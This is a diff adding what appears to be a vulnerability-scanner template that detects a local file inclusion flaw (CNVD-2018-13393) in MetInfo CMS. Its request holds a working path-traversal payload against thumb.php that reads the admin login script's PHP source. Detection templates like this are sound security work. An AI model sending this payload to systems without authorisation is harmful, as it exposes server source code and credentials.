@@ -1,0 +1,22 @@
+id: poc-yaml-metinfo-lfi-cnvd-2018-13393
+info:
+  name: Metinfo 本地文件包含漏洞(CNVD-2018-13393)
+  severity: high
+  tags:
+  - lfi
+  - CNVD-2018-13393
+  finger: Metinfo
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /include/thumb.php?dir=http\..\admin\login\login_check.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: contains(body, "<?php") && contains(body, "login_met_cookie($metinfo_admin_name);")
+  output: []
